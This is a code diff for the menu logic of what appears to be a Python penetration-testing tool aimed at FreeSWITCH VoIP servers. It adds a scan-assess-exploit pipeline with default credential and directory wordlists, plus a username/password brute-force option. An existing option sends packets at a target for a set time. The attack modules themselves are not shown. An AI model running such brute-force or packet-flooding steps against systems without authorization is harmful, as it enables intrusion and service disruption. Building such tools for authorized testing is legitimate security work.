@@ -9,29 +9,40 @@ from py_console import console
 from modules.ultilities import ip_valid
 import sys
 
+
 def continue_step(menu):
     choice = continue_menu()
     if choice == 1:
         main_flow(menu)
     if choice == 2:
         clear.clrscr()
-        welcome_screen.banner('','',term_size.get_terminal_size("width"))
+        welcome_screen.banner('', '', term_size.get_terminal_size("width"))
         main_flow(print_menu())
     else:
         clear.clrscr()
         print('See you again!!!')
 
+
 def main_flow(choice):
+    default_username_list = 'data/wordlist/username.txt'
+    default_password_list = 'data/wordlist/password.txt'
+    default_fuzzing_list = 'data/wordlist/sample_dir.txt'
     if (choice == 1):
         try:
-            ip = str(input("Enter your IP address: "))
-            validated_data = ip_valid.validator(ip)
-            scandata = scanning(validated_data)
-            vulndata = vulnassesst('signalwire', 'freeswitch')
-            exploit()
-            report(scandata,vulndata)
-            console.success("Running cycle complete successfully!")
-            continue_step(choice)
+            ip = str(input("Enter your IP address: ")).strip()
+            if (ip_valid.validator(ip)):
+                scandata = scanning(ip)
+                vul_data = vulnassesst(ip, scandata)
+                print('------------------------------------------------')
+                input("Press Enter to continue to Pentest phase...")
+                pentest_data = exploit(
+                    ip, default_username_list, default_password_list, default_fuzzing_list)
+                report(scandata, vul_data, pentest_data)
+                console.success("Running cycle complete successfully!")
+                continue_step(choice)
+            else:
+                console.error("Incorrect IP format!!!")
+                pass
         except Exception as e:
             console.error("An Error Occurred!!!")
             console.error(e)
@@ -42,7 +53,8 @@ def main_flow(choice):
 
     if (choice == 21):
         try:
-            ip = str(input("Enter your IP address: "))
+            ip = input("Enter your IP address: ")
+            ip = ip.rstrip('\n')
             scanning(str(ip))
             continue_step(choice)
         except Exception as e:
@@ -55,9 +67,8 @@ def main_flow(choice):
 
     if (choice == 22):
         try:
-            vendor = str(input("Enter vendor: "))
-            product = str(input("Enter product: "))
-            vulnassesst(vendor,product)
+            cpe = str(input("Enter cpe: "))
+            # vulnassesst(ip, cpe)
             continue_step(choice)
         except Exception as e:
             console.error("An Error Occurred!!!")
@@ -85,7 +96,7 @@ def main_flow(choice):
             ip = str(input('Target IP: '))
             port = int(input('Port: '))
             duration = int(input('Number of seconds to send packets: '))
-            exploit(ip,port,duration)
+            exploit(ip, port, duration)
             continue_step(choice)
         except Exception as e:
             console.error("An Error Occurred!!!")
@@ -109,7 +120,11 @@ def main_flow(choice):
 
     if (choice == 234):
         try:
-            print('Identity spoofing')
+            print('Identity(Username/Password) Bruteforce')
+            ip = str(input('Target IP:'))
+            usernames = str(input('Username wordlist:'))
+            passwords = str(input('Password wordlist:'))
+            bruteforce_login.bruteforcelogin(ip, usernames, passwords)
             continue_step(choice)
         except Exception as e:
             console.error("An Error Occurred!!!")
